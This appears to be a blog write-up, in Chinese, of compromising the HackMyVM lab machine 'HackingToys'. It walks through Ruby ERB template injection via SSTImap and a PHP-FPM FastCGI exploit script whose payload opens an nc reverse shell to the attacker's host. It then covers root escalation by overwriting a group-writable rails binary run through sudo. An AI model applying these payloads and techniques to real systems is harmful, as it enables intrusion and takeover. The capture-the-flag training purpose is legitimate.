{"pageProps":{"postData":{"id":"HackMyVMHackingToys","contentHtml":"<h1>HackingToys.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=HackingToys\">https://hackmyvm.eu/machines/machine.php?vm=HackingToys</a></p>\n</blockquote>\n<p>Notes: <strong>Enjoy it.</strong></p>\n<h2>信息收集</h2>\n<p><code>21</code>是靶机</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]\n└─# nmap -sP 192.168.56.0/24                    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 08:05 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00055s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00050s latency).\nMAC Address: 08:00:27:EE:CF:66 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.21\nHost is up (0.00039s latency).\nMAC Address: 08:00:27:72:0C:9A (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]\n└─# nmap -sT -min-rate 10000 -p- 192.168.56.21   \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 08:06 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.21\nHost is up (0.00031s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n3000/tcp open  ppp\nMAC Address: 08:00:27:72:0C:9A (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 17.21 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]                                                           \n└─# nmap -sT -A -T4 -O -P 22,3000 192.168.56.21                               \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 08:07 EST                                                                                           \nFailed to resolve <span class=\"hljs-string\">\"22,3000\"</span>.                                                  \nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.21                                            \nHost is up (0.00060s latency).                                                \nNot shown: 998 closed tcp ports (conn-refused)                                \nPORT     STATE SERVICE  VERSION                                               \n22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)     \n| ssh-hostkey:                                                                \n|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)           \n|_  256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)             \n3000/tcp open  ssl/ppp?                                                       \n| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=FR\n| Not valid before: 2024-05-20T15:36:20                                       \n|_Not valid after:  2038-01-27T15:36:20                                       \n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>\nMAC Address: 08:00:27:72:0C:9A (Oracle VirtualBox virtual NIC)                \nDevice <span class=\"hljs-built_in\">type</span>: general purpose                                                                                                                                 \nRunning: Linux 4.X|5.X                                                        \nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5               \nOS details: Linux 4.15 - 5.8                                                  \nNetwork Distance: 1 hop                                                       \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                       \n                                                                              \nTRACEROUTE                                                                    \nHOP RTT     ADDRESS                                                                                                                                          \n1   0.60 ms 192.168.56.21                                                                                                                                    \n                                                                                                                                                             \nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                        \nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 82.79 seconds  \n</code></pre>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]\n└─# nmap -script=vuln -p 22,3000 192.168.56.21  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 08:10 EST\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.21\nHost is up (0.00067s latency).\n\nPORT     STATE SERVICE\n22/tcp   open  ssh\n3000/tcp open  ppp\nMAC Address: 08:00:27:72:0C:9A (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 84.46 seconds\n\n</code></pre>\n<p><code>3000</code>是未知端口,该端口被检测为可能使用 SSL 加密，但实际上 SSL 连接解析失败。提示服务是 <strong>Puma</strong>，一个常用于 <code>Ruby on Rails</code> 应用的 Web 服务器。</p>\n<p>那么优先级 <code>3000</code> > <code>22</code></p>\n<h2>前期踩点</h2>\n<p>访问<code>3000</code>端口主页，要使用<code>https</code>来访问</p>\n<p><img src=\"/post-images/HackMyVMHackingToys/image70.png\" alt=\"image.png\"></p>\n<p>看一下指纹信息，和<code>nmap</code>扫描的结果一样，<code>Ruby on Rails</code> 应用的 Web 服务器</p>\n<p><img src=\"/post-images/HackMyVMHackingToys/image71.png\" alt=\"image.png\"></p>\n<p>点击超链接，可以发现是通过<code>https://192.168.56.21:3000/products/show/1</code> 最后边的数字来跳转的</p>\n<p>当数字超过<code>5</code>后，则会报错，应该是<code>debug</code>没有关闭</p>\n<p><img src=\"/post-images/HackMyVMHackingToys/image72.png\" alt=\"image.png\"></p>\n<p>尝试了下目录爆破，但是速度很慢，可能是对请求数量做了限制</p>\n<p>浏览一下是否存在<code>robots.txt</code>文件，存在，内容如下（robots.txt 文件规范说明来自官方网站 <code>robotstxt.org</code>，很多网站开发者直接引用）</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># See https://www.robotstxt.org/robotstxt.html for documentation on how to use the robots.txt file</span>\n</code></pre>\n<p><img src=\"/post-images/HackMyVMHackingToys/image73.png\" alt=\"image.png\"></p>\n<p>尝试网上的目录穿越漏洞，无果</p>\n<p>存在<code>XSS</code>，但是没办法利用</p>\n<p><img src=\"/post-images/HackMyVMHackingToys/image74.png\" alt=\"image.png\"></p>\n<h2>SSTI 模板注入</h2>\n<p>经过测试，测试出来了个<code>SSTI</code> ，<code>message</code>上的编码解码后是：<code>&#x3C;%= self.methods %></code></p>\n<p><img src=\"/post-images/HackMyVMHackingToys/image75.png\" alt=\"image.png\"></p>\n<p>使用<code>SSTImap</code>来梭哈</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/Tools/SSTImap]\n└─# ./sstimap.py -u <span class=\"hljs-string\">\"https://192.168.56.21:3000/search?message=*&#x26;query=1\"</span>\n[+] Erb plugin has confirmed injection with tag <span class=\"hljs-string\">'*'</span> \n[+] SSTImap identified the following injection point:\n\n  Query parameter: message\n  Engine: Erb\n  Injection: *\n  Context: text\n  OS: x86_64-linux\n  Technique: render\n  Capabilities:\n\n    Shell <span class=\"hljs-built_in\">command</span> execution: ok\n    Bind and reverse shell: ok\n    File write: ok\n    File <span class=\"hljs-built_in\">read</span>: ok\n    Code evaluation: ok, ruby code\n\n[+] Rerun SSTImap providing one of the following options:\n    --interactive                Run SSTImap <span class=\"hljs-keyword\">in</span> interactive mode to switch between exploitation modes without losing progress.\n    --os-shell                   Prompt <span class=\"hljs-keyword\">for</span> an interactive operating system shell.\n    --os-cmd                     Execute an operating system <span class=\"hljs-built_in\">command</span>.\n    --eval-shell                 Prompt <span class=\"hljs-keyword\">for</span> an interactive shell on the template engine base language.\n    --eval-cmd                   Evaluate code <span class=\"hljs-keyword\">in</span> the template engine base language.\n    --tpl-shell                  Prompt <span class=\"hljs-keyword\">for</span> an interactive shell on the template engine.\n    --tpl-cmd                    Inject code <span class=\"hljs-keyword\">in</span> the template engine.\n    --bind-shell PORT            Connect to a shell <span class=\"hljs-built_in\">bind</span> to a target port.\n    --reverse-shell HOST PORT    Send a shell back to the attacker<span class=\"hljs-string\">'s port.\n    --upload LOCAL REMOTE        Upload files to the server.\n    --download REMOTE LOCAL      Download remote files.\n</span></code></pre>\n<p>直接<code>--os-shell</code> 拿到<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">[+] SSTImap identified the following injection point:\n\n  Query parameter: message\n  Engine: Erb\n  Injection: *\n  Context: text\n  OS: x86_64-linux\n  Technique: render\n  Capabilities:\n\n    Shell <span class=\"hljs-built_in\">command</span> execution: ok\n    Bind and reverse shell: ok\n    File write: ok\n    File <span class=\"hljs-built_in\">read</span>: ok\n    Code evaluation: ok, ruby code\n\n[+] Run commands on the operating system.\nx86_64-linux $ \n</code></pre>\n<h2>靶机信息收集</h2>\n<pre><code class=\"hljs language-bash\">x86_64-linux $ <span class=\"hljs-built_in\">id</span>\nuid=1000(lidia) gid=1000(lidia) <span class=\"hljs-built_in\">groups</span>=1000(lidia),100(<span class=\"hljs-built_in\">users</span>),1002(rvm)\n\nx86_64-linux $ <span class=\"hljs-built_in\">uname</span> -a\nLinux hacktoys 6.1.0-21-amd64 <span class=\"hljs-comment\">#1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux</span>\n\nx86_64-linux $ ip add\n1: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host noprefixroute \n       valid_lft forever preferred_lft forever\n2: enp0s3: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/ether 08:00:27:72:0c:9a brd ff:ff:ff:ff:ff:ff\n    inet 192.168.56.21/24 brd 192.168.56.255 scope global dynamic enp0s3\n       valid_lft 399sec preferred_lft 399sec\n    inet6 fe80::a00:27ff:fe72:c9a/64 scope <span class=\"hljs-built_in\">link</span> \n       valid_lft forever preferred_lft forever\n\n</code></pre>\n<p>属于<code>rvm</code>组，用户 <code>lidia</code> 可以管理和使用 <code>RVM</code> 环境，这意味着她可能拥有对 <code>Ruby</code> 版本和 <code>Gem</code> 包管理的权限</p>\n<p>因为<code>SSTImap</code>获得的<code>shell</code> ，有限制我们将其反弹到了<code>kali</code>上（省略反弹步骤）</p>\n<p>存在<code>master.key</code>所以可以查看<code>credentials.yml.enc</code> ，只能看到有<code>secret_key_base</code></p>\n<pre><code class=\"hljs language-bash\">/opt/app/gadgets/config$ rails credentials:show\nrails credentials:show\n<span class=\"hljs-comment\"># aws:</span>\n<span class=\"hljs-comment\">#   access_key_id: 123</span>\n<span class=\"hljs-comment\">#   secret_access_key: 345</span>\n\n<span class=\"hljs-comment\"># Used as the base secret for all MessageVerifiers in Rails, including the one protecting cookies.</span>\nsecret_key_base: 580d52cd8ed1b40e6d69f01c9e519e55ca47dd464083320f7452179b9fbf22f7ce2bd914671a698d0e35c91fab990368625afc99ff3b4b0f1960359f56b444e8\n</code></pre>\n<p>在<code>/var/www/html</code>中发现有内容，但是<code>3000</code>端口的服务是在<code>/opt/app/gadgets/</code> 目录下的</p>\n<p>查看一下当前网络连接信息，存在<code>http</code>端口</p>\n<pre><code class=\"hljs language-bash\">lidia@hacktoys:/var/www/html$ ss -tulp\nNetid State  Recv-Q Send-Q Local Address:Port   Peer Address:PortProcess                       \nudp   UNCONN 0      0            0.0.0.0:bootpc      0.0.0.0:*                                 \ntcp   LISTEN 0      4096       127.0.0.1:9000        0.0.0.0:*                                 \ntcp   LISTEN 0      128          0.0.0.0:ssh         0.0.0.0:*                                 \ntcp   LISTEN 0      511        127.0.0.1:http        0.0.0.0:*                                 \ntcp   LISTEN 0      1024         0.0.0.0:3000        0.0.0.0:*    <span class=\"hljs-built_in\">users</span>:((\"ruby\",pid=<span class=\"hljs-number\">499</span>,fd=<span class=\"hljs-number\">7</span>))\ntcp   LISTEN 0      128             [::]:ssh            [::]:*                                 \n\n</code></pre>\n<p>我们将其使用<code>socat</code>转发出去</p>\n<pre><code class=\"hljs language-bash\">./socat TCP-LISTEN:8888,fork TCP4:127.0.0.1:80 &#x26;\n</code></pre>\n<h2>80 端口（兔子洞）</h2>\n<p>访问页面，主页是要用邮箱登录的</p>\n<p><img src=\"/post-images/HackMyVMHackingToys/image76.png\" alt=\"image.png\"></p>\n<p>我们直接看源码，没看出来什么（兔子洞）</p>\n<pre><code class=\"hljs language-bash\">lidia@hacktoys:/var/www/html$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 36\ndrwxr-xr-x 5 dodi dodi 4096 May 21  2024 .\ndrwxr-xr-x 3 root root 4096 May 20  2024 ..\n-rw-r--r-- 1 dodi root 1018 May 21  2024 coming-soon2.css\n-rw-r--r-- 1 dodi root 1680 May 21  2024 coming-soon2.html\ndrwxr-xr-x 8 root root 4096 May 21  2024 .git\ndrwxr-xr-x 2 dodi root 4096 May 21  2024 img\n-rw-r--r-- 1 dodi root 3633 May 21  2024 index.php\n-rw-r--r-- 1 dodi root 2015 May 21  2024 style.css\ndrwxr-xr-x 2 root root 4096 May 21  2024 .vscode\n</code></pre>\n<p>注意到还有个<code>.git</code>文件夹，使其直接信任该目录，如何<code>git log</code>查看历史</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># 让其信任信任该文件夹</span>\nlidia@hacktoys:/var/www/html$ git config --global --add safe.directory /var/www/html\n</code></pre>\n<pre><code class=\"hljs language-bash\">lidia@hacktoys:/var/www/html$ git <span class=\"hljs-built_in\">log</span>                                         \ngit <span class=\"hljs-built_in\">log</span>                                                                       \ncommit c28e2672361c2ca3e1ee49bbcba89c3c68a771f1                       \nAuthor: Vishal pandey &#x3C;70359874+vishalps2606@users.noreply.github.com>\nDate:   Sat Aug 12 19:35:55 2023 +0530 \n                                                                              \n    Rename coming-soon.component.css to coming-soon2.css\n                                                                              \ncommit c201b438dc21023bcf85ea6bf3055d4331c26968                       \nAuthor: Vishal pandey &#x3C;70359874+vishalps2606@users.noreply.github.com>\nDate:   Sat Aug 12 19:35:20 2023 +0530                                        \n                                       \n    Rename coming-soon.component.html to coming-soon2.html              \n                                                                              \ncommit 9d4a0977e779d7be10823d5c9af269a3287838ba                       \nAuthor: Vishal pandey &#x3C;70359874+vishalps2606@users.noreply.github.com>\nDate:   Sat Aug 12 19:34:21 2023 +0530                                                                                                                       \n                                                                              \n    Update coming-soon2.html           \n                                                                              \ncommit 8d1db3b19e8bcc69c03477975dd3d8c756037ad7                       \nAuthor: Vishal pandey &#x3C;70359874+vishalps2606@users.noreply.github.com>\nDate:   Sat Aug 12 19:31:54 2023 +0530                                        \n                                       \n    Added Another coming soon template\n                                                                              \ncommit f47c5a98979d0f675b7fe490b7d28386f94b5a72                      \nAuthor: Vishal pandey &#x3C;70359874+vishalps2606@users.noreply.github.com>        \nDate:   Tue Aug 1 13:46:36 2023 +0530                                         \n                                                                                                                                                             \n    Update index.html  \ncommit efe8ad58208498bf9fe4a8fe0b709dd330ea0527                               \nAuthor: Vishal pandey &#x3C;70359874+vishalps2606@users.noreply.github.com>\nDate:   Thu Sep 16 08:41:40 2021 +0530                                        \n                                       \n    Delete logo img                                                           \n                                                                              \ncommit a3820cf829ee5e0245bb715e9eae0d3effb5caa4                               \nAuthor: Vishal pandey &#x3C;70359874+vishalps2606@users.noreply.github.com>\nDate:   Thu Sep 16 08:38:04 2021 +0530                                        \n                                                                              \n    Update some information.           \n                                                                              \ncommit 439b881889a63a1dcd1c18a1315585d10ff89382                               \nAuthor: Vishal pandey &#x3C;70359874+vishalps2606@users.noreply.github.com>\nDate:   Sun Sep 12 13:54:09 2021 +0530                                        \n                                                                                                                                                             \n    Update README.md                                                          \n                                       \ncommit 208830141b773545f190ef209d7d1b4119b8f21b                               \nAuthor: Vishal pandey &#x3C;70359874+vishalps2606@users.noreply.github.com>\nDate:   Sun Sep 12 13:49:53 2021 +0530                                        \n                                                                              \n    Create Readme                      \n                                       \ncommit f51d1f17fb9e67698189dc845fbf8bf3657f46ad                               \nAuthor: vishalps2606 &#x3C;70359874+vishalps2606@users.noreply.github.com>\nDate:   Sun Sep 12 12:08:36 2021 +0530                                        \n                                                                              \n    First commit                                              \n</code></pre>\n<p>也没什么发现，好像也是兔子洞…</p>\n<h2>PHP FastCGI</h2>\n<p>我们还注意到查看网络信息的时候还存在<code>9000</code>端口</p>\n<pre><code class=\"hljs language-bash\">lidia@hacktoys:/var/www/html$ ss -tulp\nNetid State  Recv-Q Send-Q Local Address:Port   Peer Address:PortProcess                       \nudp   UNCONN 0      0            0.0.0.0:bootpc      0.0.0.0:*                                 \ntcp   LISTEN 0      4096       127.0.0.1:9000        0.0.0.0:*                                 \ntcp   LISTEN 0      128          0.0.0.0:ssh         0.0.0.0:*                                 \ntcp   LISTEN 0      511        127.0.0.1:http        0.0.0.0:*                                 \ntcp   LISTEN 0      1024         0.0.0.0:3000        0.0.0.0:*    <span class=\"hljs-built_in\">users</span>:((\"ruby\",pid=<span class=\"hljs-number\">499</span>,fd=<span class=\"hljs-number\">7</span>))\ntcp   LISTEN 0      128             [::]:ssh            [::]:*                                 \n</code></pre>\n<p><strong>PHP-FPM（FastCGI Process Manager）</strong></p>\n<ul>\n<li><strong>用途:</strong> 提供 <code>PHP</code> 的 <code>FastCGI</code> 服务，通常与 <code>NGINX</code> 或 <code>Apache</code> 配合使用。</li>\n<li><strong>默认端口:</strong> <code>9000</code></li>\n</ul>\n<p>先将其使用<code>socat</code>转发出来</p>\n<pre><code class=\"hljs language-bash\">./socat TCP-LISTEN:9001,fork TCP4:127.0.0.1:9000 &#x26;\n</code></pre>\n<p>再使用<code>nmap</code>扫描，能扫到了</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]\n└─# nmap -sT -min-rate 10000 -p- 192.168.56.21\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 10:42 EST\nStats: 0:00:04 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan\nParallel DNS resolution of 1 host. Timing: About 0.00% <span class=\"hljs-keyword\">done</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.21\nHost is up (0.0014s latency).\nNot shown: 65531 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n3000/tcp open  ppp\n8888/tcp open  sun-answerbook\n9001/tcp open  tor-orport\nMAC Address: 08:00:27:72:0C:9A (Oracle VirtualBox virtual NIC)\n</code></pre>\n<p>网上说存在远程<code>RCE</code>漏洞</p>\n<blockquote>\n<p><a href=\"https://exploit-notes.hdks.org/exploit/network/fastcgi-pentesting/\">https://exploit-notes.hdks.org/exploit/network/fastcgi-pentesting/</a> 使用这里的脚本</p>\n</blockquote>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-meta\">#!/bin/bash</span>\n\nPAYLOAD=<span class=\"hljs-string\">\"&#x3C;?php echo '&#x3C;!--'; system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&#x26;1|nc 192.168.56.4 1234 >/tmp/f'); echo '-->';\"</span>\nFILENAMES=<span class=\"hljs-string\">\"/var/www/html/index.php\"</span> <span class=\"hljs-comment\"># Exisiting file path</span>\n\nHOST=<span class=\"hljs-variable\">$1</span>\nB64=$(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$PAYLOAD</span>\"</span>|<span class=\"hljs-built_in\">base64</span>)\n\n<span class=\"hljs-keyword\">for</span> FN <span class=\"hljs-keyword\">in</span> <span class=\"hljs-variable\">$FILENAMES</span>; <span class=\"hljs-keyword\">do</span>\n    OUTPUT=$(<span class=\"hljs-built_in\">mktemp</span>)\n    <span class=\"hljs-built_in\">env</span> -i \\\n      PHP_VALUE=<span class=\"hljs-string\">\"allow_url_include=1\"</span>$<span class=\"hljs-string\">'\\n'</span><span class=\"hljs-string\">\"allow_url_fopen=1\"</span>$<span class=\"hljs-string\">'\\n'</span><span class=\"hljs-string\">\"auto_prepend_file='data://text/plain\\;base64,<span class=\"hljs-variable\">$B64</span>'\"</span> \\\n      SCRIPT_FILENAME=<span class=\"hljs-variable\">$FN</span> SCRIPT_NAME=<span class=\"hljs-variable\">$FN</span> REQUEST_METHOD=POST \\\n      cgi-fcgi -<span class=\"hljs-built_in\">bind</span> -connect <span class=\"hljs-variable\">$HOST</span>:9000 &#x26;> <span class=\"hljs-variable\">$OUTPUT</span>\n\n    <span class=\"hljs-built_in\">cat</span> <span class=\"hljs-variable\">$OUTPUT</span>\n<span class=\"hljs-keyword\">done</span>\n</code></pre>\n<p>如何<code>kali</code>开启监听<code>1234</code>端口，执行脚本</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test/Hackingtoy]\n└─# ./exp.sh 192.168.56.21:9001\n</code></pre>\n<p>成功获得<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]\n└─# nc -lvp 1234         \nlistening on [any] 1234 ...\n192.168.56.21: inverse host lookup failed: Host name lookup failure\nconnect to [192.168.56.4] from (UNKNOWN) [192.168.56.21] 53854\n/bin/sh: 0: can<span class=\"hljs-string\">'t access tty; job control turned off\n$ $ id\nuid=1001(dodi) gid=1001(dodi) groups=1001(dodi),100(users)\n</span></code></pre>\n<h2>提权</h2>\n<p>查看其权限</p>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> dodi on hacktoys:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser dodi may run the following commands on hacktoys:\n    (ALL : ALL) NOPASSWD: /usr/local/bin/rvm_rails.sh\n    \n$ <span class=\"hljs-built_in\">ls</span> -al /usr/local/bin/rvm_rails.sh\n-rwxr-xr-x 1 root root 660 May 20  2024 /usr/local/bin/rvm_rails.sh\n</code></pre>\n<p>可以以<code>Root</code>权限执行<code>rvm_rails.sh</code>脚本，但是没有修改权限</p>\n<p>注意到<code>exec /usr/local/rvm/gems/ruby-3.1.0/bin/rail</code> 执行文件，并且目录是<code>rvm</code> ，上一个用户是属于<code>rvm</code> 组的，所以可能存在修改权限</p>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">cat</span> /usr/local/bin/rvm_rails.sh\n<span class=\"hljs-comment\">#!/bin/bash</span>\n<span class=\"hljs-built_in\">export</span> rvm_prefix=/usr/local\n<span class=\"hljs-built_in\">export</span> MY_RUBY_HOME=/usr/local/rvm/rubies/ruby-3.1.0\n<span class=\"hljs-built_in\">export</span> RUBY_VERSION=ruby-3.1.0\n<span class=\"hljs-built_in\">export</span> rvm_version=1.29.12\n<span class=\"hljs-built_in\">export</span> rvm_bin_path=/usr/local/rvm/bin\n<span class=\"hljs-built_in\">export</span> GEM_PATH=/usr/local/rvm/gems/ruby-3.1.0:/usr/local/rvm/gems/ruby-3.1.0@global\n<span class=\"hljs-built_in\">export</span> GEM_HOME=/usr/local/rvm/gems/ruby-3.1.0\n<span class=\"hljs-built_in\">export</span> PATH=/usr/local/rvm/gems/ruby-3.1.0/bin:/usr/local/rvm/gems/ruby-3.1.0@global/bin:/usr/local/rvm/rubies/ruby-3.1.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin\n<span class=\"hljs-built_in\">export</span> IRBRC=/usr/local/rvm/rubies/ruby-3.1.0/.irbrc\n<span class=\"hljs-built_in\">export</span> rvm_path=/usr/local/rvm\n<span class=\"hljs-built_in\">exec</span> /usr/local/rvm/gems/ruby-3.1.0/bin/rails <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>\n</code></pre>\n<p>查看权限，拥有修改权限</p>\n<pre><code class=\"hljs language-bash\">lidia@hacktoys:~$ <span class=\"hljs-built_in\">ls</span> -al /usr/local/rvm/gems/ruby-3.1.0/bin/rails\n-rwxrwxr-x 1 root rvm 566 May 20  2024 /usr/local/rvm/gems/ruby-3.1.0/bin/rails\n</code></pre>\n<p>往里边添加提权语句</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"/bin/bash\"</span> > /usr/local/rvm/gems/ruby-3.1.0/bin/rails\n</code></pre>\n<p>回到<code>dodi</code>用户，执行文件，获得<code>Root</code></p>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">sudo</span> /usr/local/bin/rvm_rails.sh\n<span class=\"hljs-built_in\">id</span>\nuid=0(root) gid=0(root) <span class=\"hljs-built_in\">groups</span>=0(root),1002(rvm)\n</code></pre>\n<h2>RootFlag &#x26; UserFlag</h2>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cat</span> /root/root.txt\n64aa5a7aaf42af74ee6b59d5ac5c1509\n<span class=\"hljs-built_in\">cat</span> /home/dodi/user.txt\nb075b24bdb11990e185c32c43539c39f\n</code></pre>\n<h2>总结</h2>\n<p>第一次遇到<code>Ruby</code>的模板注入，学习到如何辨识，以及<code>Nginx</code>和<code>PHP FPM</code>一块可能存在漏洞，但是默认<code>nmap</code>是扫描不到的</p>","title":"HackMyVM - HackingToys","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"HackingToys.\n\n https://hackmyvm.eu/machines/machine.php?vm=HackingToys\n \n\nNotes: Enjoy it.\n\n信息收集\n\n`21`是靶机\n\n\n\n\n\n\n\n\n\n`3000`是未知端口,该端口被检测为可能使用 SSL 加密，但实际上 SSL 连接解析失败。提示服务是 Puma，一个常用于 `Ruby on Rails` 应用的 W..."},"recentPosts":[{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsB I G","title":"TheHackersLabs - B.I.G","date":"2025-07-18","isEncrypted":false,"year":"2025","month":"07","day":"18"},{"id":"TheHackersLabsBlackGold","title":"TheHackersLabs - BlackGold","date":"2025-07-15","isEncrypted":false,"year":"2025","month":"07","day":"15"},{"id":"TheHackersLabsSedition","title":"TheHackersLabs - Sedition","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"}]},"__N_SSG":true}